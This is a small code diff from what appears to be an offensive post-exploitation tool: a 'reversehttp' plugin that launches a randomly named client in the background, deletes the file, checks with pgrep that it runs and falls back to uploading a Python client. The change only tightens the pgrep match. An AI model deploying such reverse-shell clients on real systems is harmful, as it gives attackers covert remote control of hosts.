@@ -132,7 +132,7 @@ class reversehttp(basePlugin):
 		print haxhelper.executeSystemCommand(" %s  %s  &" % (env_string, rand_name))
 		print haxhelper.executeSystemCommand("rm -rvf %s" % rand_name)
 		time.sleep(5)
-		if haxhelper.executeSystemCommand("pgrep  %s" % rand_name)=="":
+		if haxhelper.executeSystemCommand("pgrep -f ^%s$" % rand_name)=="":
 			print "Unable to run the client. Perhaps the readline bug? Fallingback to the python script"
 			print "Uploading client to %s  ..." % rand_name
 			bytes = haxhelper.uploadfile("./build/client.py", rand_name, chunksize=1024)
